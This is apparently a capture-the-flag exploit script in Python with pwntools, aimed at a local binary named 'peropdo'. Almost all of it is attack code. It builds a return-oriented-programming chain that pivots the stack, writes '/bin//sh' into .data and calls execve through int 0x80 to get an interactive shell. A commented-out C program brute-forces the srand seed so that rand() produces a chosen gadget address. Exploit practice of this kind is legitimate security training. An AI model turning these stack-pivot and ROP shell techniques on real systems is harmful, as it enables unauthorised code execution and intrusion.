from pwn import *
from struct import pack

io = process('./peropdo')
context.log_level = 'debug'
pause()

io.recvuntil('name?')
payload = p32(0x427bef70)
# 0x080507b6: pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
payload += p32(0) * 3
p = ''

p += pack('<I', 0x0806f2fa) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080e77a4) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08066214) # mov dword ptr [edx], eax ; mov eax, edx ; ret
p += pack('<I', 0x0806f2fa) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080e77a4) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08066214) # mov dword ptr [edx], eax ; mov eax, edx ; ret
p += pack('<I', 0x0806f2fa) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x08054b80) # xor eax, eax ; ret
p += pack('<I', 0x08066214) # mov dword ptr [edx], eax ; mov eax, edx ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080e5ee1) # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x0806f2fa) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x08054b80) # xor eax, eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x0807bf06) # inc eax ; ret
p += pack('<I', 0x08049551) # int 0x80
payload += p

io.sendline(payload)

io.recvuntil('?')
io.sendline('24')

io.interactive() 

# so this challenge is easy actually. if we can find one gadget which is 'pop esp'
# since the one next to ret_addr is 'name'
# and we can brute the seed

##include <stdio.h>
#
#int main()
#{
#    int i, j;
#
#    for(j = 0x7fffffff; j>0; --j)
#    {
#        srand(j);
#
#        for(i = 0; i< 23; ++i)
#            rand();
#        if(rand() == 0x080507b6)
#        {
#            printf("%x\n", j);
#            return 0;
#        }
#    }
#}

#one thing to remember is that scanf will be cut off by 0x0a and 0x0b
